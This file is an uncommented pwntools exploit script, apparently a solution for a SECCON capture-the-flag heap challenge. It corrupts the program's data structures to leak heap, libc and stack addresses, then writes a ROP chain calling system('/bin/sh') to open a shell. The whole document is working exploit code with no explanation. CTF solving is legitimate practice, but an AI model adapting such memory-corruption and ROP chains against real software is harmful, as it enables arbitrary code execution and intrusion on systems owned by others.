from pwn import *

io = process('./chall')
#io = remote('datastore1.seccon.games', 4585)
libc = ELF('./libc.so.6')



sla = io.sendlineafter
sa = io.sendafter

sla(b'> ', b'1')
sla(b'>', b'a')
sla(b'size: ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'6')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', (b'aaaaaaaa'+p64(0)) * 4 + b'\0'*6)

sla(b'> ', b'1')
sla(b'index: ', b'2')
sla(b'> ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'2')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', b'6')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'6')
sla(b'> ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'2')
sla(b'> ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'2')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', b'11')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'11')
sla(b'> ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'6')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'11')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', b'200')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'1')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'2')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'16')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'3')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'16')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'4')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'16')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'5')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'16')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'7')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'2')

sla(b'> ', b'2')
io.recvuntil(b'[00] <S> ')
heap = u64(io.recv(6)+b'\0\0')
log.info('heap: '+hex(heap))

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'1')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', p64(0x510)+p64(heap+0xc0)+b'a'*54)

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b': ', p64(heap)+p64(0xfeed0002)+p64(heap + 0x540))

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'7')
sla(b'> ', b'1')
sla(b': ', b'a'*8+p64(0x441))

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'2')
sla(b'> ', b'2')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'1')
sla(b'> ', b'1')
sla(b'index: ', b'1')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', p64(0x510)+p64(heap+0x140)+b'a'*54)

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b': ', p64(heap)+p64(0xfeed0002)+p64(heap + 0xd0))

sla(b'> ', b'2')
io.recvuntil(b'[07] <S> ')
libc.address = u64(io.recv(6)+b'\0\0')-0x219ce0
log.info('libc: '+hex(libc.address))

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'3')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', p64(0x510)+p64(libc.sym['environ'])+b'a'*54)

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b': ', p64(heap)+p64(0xfeed0002)+p64(heap + 0x140))

sla(b'> ', b'2')
io.recvuntil(b'[07] <S> ')
stack = u64(io.recv(6)+b'\0\0')
log.info('environ: '+hex(stack))
stack -= 0x120

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'4')
sla(b'> ', b'1')
sla(b'index: ', b'15')
sla(b'> ', b'1')
sla(b'> ', b'a')
sla(b'size: ', b'5')

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'4')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'> ', b'v')
sla(b'value: ', p64(0x510)+p64(stack))

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b': ', p64(heap)+p64(0xfeed0002)+p64(heap + 0x210))

poprdi = libc.address + 0x000000000002a3e5
bsh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

sla(b'> ', b'1')
sla(b'index: ', b'0')
sla(b'> ', b'1')
sla(b'index: ', b'7')
sla(b'> ', b'1')
sla(b': ', p64(poprdi+1)+p64(poprdi)+p64(bsh)+p64(system))

sla(b'> ', b'0')

sla(b'', b'ls')

io.interactive()